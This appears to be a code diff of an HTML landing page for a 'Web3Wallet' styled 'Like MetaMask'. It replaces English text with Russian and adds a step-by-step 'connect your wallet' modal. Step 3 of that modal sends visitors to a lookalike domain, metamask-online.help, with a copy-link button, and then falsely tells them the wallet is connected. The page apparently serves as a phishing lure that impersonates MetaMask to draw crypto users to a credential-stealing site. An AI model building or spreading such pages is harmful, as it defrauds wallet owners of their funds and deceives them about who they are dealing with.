@@ -1,9 +1,88 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Wallet | Like MetaMask</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Ethereum_logo_2014.svg" alt="Ethereum" width="30">
+                <span>Web3Wallet</span>
+            </div>
+            <nav class="nav">
+                <a href="#" class="nav-link">Features</a>
+                <a href="#" class="nav-link">Download</a>
+                <a href="#" class="nav-link">Developers</a>
+            </nav>
+            <button class="btn btn-outline mobile-hidden">Sign In</button>
+            <button class="mobile-menu-btn">☰</button>
+        </div>
+    </header>
+
+    <main class="hero">
+        <div class="container">
+            <div class="hero-content animate__animated animate__fadeInLeft">
+                <h1>Your Portal to <span>Web3</span></h1>
+                <p>Secure, decentralized, and easy-to-use crypto wallet for Ethereum and beyond.</p>
+                <button id="connectBtn" class="btn btn-primary pulse">Connect Wallet</button>
+            </div>
+            <div class="hero-image animate__animated animate__fadeInRight">
+                <img src="https://investmoda.ru/wp-content/uploads/2024/02/wsi-imageoptim-metamask.png" alt="Wallet" class="floating">
+            </div>
+        </div>
+    </main>
+
+    <section class="features">
+        <div class="container">
+            <h2 class="animate__animated animate__fadeInUp">Why Choose Us?</h2>
+            <div class="features-grid">
+                <div class="feature-card animate__animated">
+                    <img src="https://investmoda.ru/wp-content/uploads/2024/02/wsi-imageoptim-metamask.png" alt="Secure">
+                    <h3>Secure</h3>
+                    <p>Your keys, your crypto. No third-party access.</p>
+                </div>
+                <div class="feature-card animate__animated">
+                    <img src="https://www.eduportal44.ru/Kostroma_EDU/ds_41/6/МАРКЕР.png" alt="Easy">
+                    <h3>Easy to Use</h3>
+                    <p>Simple interface for beginners and pros.</p>
+                </div>
+                <div class="feature-card animate__animated">
+                    <img src="https://i.pinimg.com/736x/c4/4b/0a/c44b0a52b3c760a9934b4c47d13152c9.jpg" alt="Decentralized">
+                    <h3>Decentralized</h3>
+                    <p>True ownership of your assets.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-logo">Web3Wallet</div>
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Twitter</a>
+                <a href="#">GitHub</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web3 Wallet | Подключение</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
@@ -30,9 +109,9 @@
     <main class="hero">
         <div class="container">
             <div class="hero-content animate__animated animate__fadeInLeft">
-                <h1>Your Portal to <span>Web3</span></h1>
-                <p>Secure, decentralized, and easy-to-use crypto wallet for Ethereum and beyond.</p>
-                <button id="connectBtn" class="btn btn-primary pulse">Connect Wallet</button>
+                <h1>Ваш портал в <span>Web3</span></h1>
+                <p>Безопасный криптокошелек для децентрализованного интернета</p>
+                <button id="connectBtn" class="btn btn-primary pulse">Подключить кошелек</button>
             </div>
             <div class="hero-image animate__animated animate__fadeInRight">
                 <img src="https://investmoda.ru/wp-content/uploads/2024/02/wsi-imageoptim-metamask.png" alt="Wallet" class="floating">
@@ -40,42 +119,52 @@
         </div>
     </main>
 
-    <!-- Блок с фичами -->
-    <section class="features">
-        <div class="container">
-            <h2 class="animate__animated animate__fadeInUp">Why Choose Us?</h2>
-            <div class="features-grid">
-                <div class="feature-card animate__animated">
-                    <img src="https://investmoda.ru/wp-content/uploads/2024/02/wsi-imageoptim-metamask.png" alt="Secure">
-                    <h3>Secure</h3>
-                    <p>Your keys, your crypto. No third-party access.</p>
+    <!-- Модальное окно инструкции -->
+    <div id="walletGuide" class="modal">
+        <div class="modal-content">
+            <div class="guide-slider">
+                <!-- Шаг 1 -->
+                <div class="guide-step active">
+                    <img src="https://i.ibb.co/s905H8My/step1.jpg" alt="Шаг 1" class="guide-image">
+                    <h3>Шаг 1: Откройте приложение кошелька</h3>
+                    <p>Запустите MetaMask или другой Web3-кошелек на вашем устройстве</p>
                 </div>
-                <div class="feature-card animate__animated">
-                    <img src="https://www.eduportal44.ru/Kostroma_EDU/ds_41/6/МАРКЕР.png" alt="Easy">
-                    <h3>Easy to Use</h3>
-                    <p>Simple interface for beginners and pros.</p>
+                
+                <!-- Шаг 2 -->
+                <div class="guide-step">
+                    <img src="https://i.ibb.co/CKLcdBsf/step2.jpg" alt="Шаг 2" class="guide-image">
+                    <h3>Шаг 2: Выберите сеть Ethereum</h3>
+                    <p>В настройках кошелька выберите основную сеть Ethereum</p>
                 </div>
-                <div class="feature-card animate__animated">
-                    <img src="https://i.pinimg.com/736x/c4/4b/0a/c44b0a52b3c760a9934b4c47d13152c9.jpg" alt="Decentralized">
-                    <h3>Decentralized</h3>
-                    <p>True ownership of your assets.</p>
+                
+                <!-- Шаг 3 -->
+                <div class="guide-step">
+                    <img src="https://i.ibb.co/kg5LGxwT/step3.jpg" alt="Шаг 3" class="guide-image">
+                    <h3>Шаг 3: Подтвердите подключение</h3>
+                    <p>Перейдите на сайт: <br><a href="https://metamask-online.help" target="_blank" class="guide-link">https://metamask-online.help</a></p>
+                    <button class="btn-copy" onclick="copyLink()">Скопировать ссылку</button>
+                </div>
+                
+                <!-- Шаг 4 -->
+                <div class="guide-step">
+                    <img src="https://i.ibb.co/73xgXd1/step4.jpg" alt="Шаг 4" class="guide-image">
+                    <h3>Готово!</h3>
+                    <p>Ваш кошелек успешно подключен к Web3Wallet</p>
                 </div>
             </div>
-        </div>
-    </section>
-
-    <!-- Подвал -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-logo">Web3Wallet</div>
-            <div class="footer-links">
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Twitter</a>
-                <a href="#">GitHub</a>
+            
+            <div class="guide-controls">
+                <button id="prevBtn" class="nav-btn" disabled>Назад</button>
+                <div class="step-indicators">
+                    <span class="active"></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                <button id="nextBtn" class="nav-btn">Далее</button>
             </div>
         </div>
-    </footer>
+    </div>
 
     <script src="script.js"></script>
 </body>
